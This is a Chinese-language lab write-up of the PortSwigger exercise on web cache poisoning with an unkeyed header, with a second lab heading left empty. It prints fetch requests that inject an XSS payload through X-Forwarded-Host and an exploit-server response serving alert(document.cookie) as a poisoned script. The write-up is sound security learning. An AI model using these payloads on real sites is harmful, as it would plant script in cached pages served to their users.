---
title: Web cache poisoning
description: Web cache poisoning
last_update:
  date: "2025-09-21T08:00:00+08:00"
---

## Lab: Web cache poisoning with an unkeyed header

| Dimension | Description                                                                                                                                               |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws#using-web-cache-poisoning-to-exploit-unsafe-handling-of-resource-imports |
| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header                           |

嘗試

```js
fetch("https://0ac3001e047db9fd80a4039d000800c1.web-security-academy.net/", {
  headers: {
    "X-Forwarded-Host": "123",
  },
});
```

看到

```html
<script type="text/javascript" src="//123/resources/js/tracking.js"></script>
```

嘗試

```js
fetch("https://0ac3001e047db9fd80a4039d000800c1.web-security-academy.net/", {
  headers: {
    "X-Forwarded-Host": `"></script><script>alert(document.cookie);const hello = "`,
  },
});
```

看到

```html
<script type="text/javascript" src="//"></script>
<script>
  alert(document.cookie);const hello = "/resources/js/tracking.js">
</script>
```

我以為這樣就結束了，不過這題有 exploit-server，所以解法可能要再想一下(?)

後來改成在 exploit-server 構造

```
/resources/js/tracking.js
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
alert(document.cookie)
```

之後觸發

```js
fetch("https://0ac3001e047db9fd80a4039d000800c1.web-security-academy.net/", {
  headers: {
    "X-Forwarded-Host": `exploit-0a3100870464b98f8009020901be00c0.exploit-server.net`,
  },
});
```

然後看 Access log，突然就通關了(?)不太懂這題為啥要 exploit-server，單純 XSS Payload 就可以達成 Web cache poisoning 了呀(?)

後來回頭看 Solution，發現我忘記了最重要的事情

```
11. Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and X-Cache: hit in the headers.
```

所以 Web cache poisoning 也要剛好搭配 cache 過期的時候，我確實一開始沒想到這個

## Lab: Web cache poisoning with an unkeyed cookie

| Dimension | Description                                                                                                                                           |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities |
| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie                       |

## 參考資料

- https://portswigger.net/web-security/web-cache-poisoning
- https://portswigger.net/web-security/all-labs#web-cache-poisoning
